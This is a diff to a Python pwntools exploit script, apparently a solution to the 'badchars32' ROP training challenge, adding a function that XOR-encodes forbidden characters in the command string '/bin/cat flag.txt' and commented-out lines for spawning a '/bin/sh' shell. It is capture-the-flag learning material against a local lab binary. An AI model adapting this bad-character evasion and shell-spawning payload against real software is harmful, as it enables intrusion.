@@ -24,6 +24,40 @@ def string2int(st):
 	
 	return res
 
+# takes string and bad characters as input and returns 3 values
+# a good string with bad characters replaced, a list of positions of bad characters
+# and the number used to XOR the bad characters
+def get_good_string(string, badchars):
+	bad = []
+	pos = []
+	final = list(string)
+
+	for i in range(len(string)):
+		if string[i] in badchars:
+			bad.append(string[i])
+			pos.append(i)
+
+	res = None
+	off = -1
+
+	for i in range(128):
+		temp = []
+
+		for ch in bad:
+			new = chr(ord(ch) ^ i)
+			if new not in badchars:
+				temp.append(new)
+		
+		if len(temp) == len(bad):
+			res = temp
+			off = i
+			break
+	
+	for i in range(len(res)):
+		final[pos[i]] = res[i]
+	
+	return ''.join(final), pos, off
+
 e = ELF('./badchars32')
 p = e.process()
 
@@ -31,17 +65,14 @@ print(p.recv().decode())
 
 # raw_input('attach gdb')
 
+# solution 2 -> spawn shell
+# st = '/bin/sh'
+
 st = '/bin/cat flag.txt'
 badchars = ['b','i','c','/', ' ', 'f', 'n', 's']
 
-# obtained by replacing bad characters with their result when xor with 2
-good = '-`kl-aat"dlag.txt'
-
-# positions of bad characters in st
-pos = [0,1,2,3,4,5,8,9]
-
-# number for xor
-xorn = 2
+# get good string, positions of badchars and number to reverse xor
+good, pos, xorn = get_good_string(st, badchars)
 
 hexs = string2int(good)
 
@@ -95,3 +126,6 @@ p.sendline(payload)
 
 flag = p.recv().decode()
 success(flag)
+
+# solution 2
+# p.interactive()
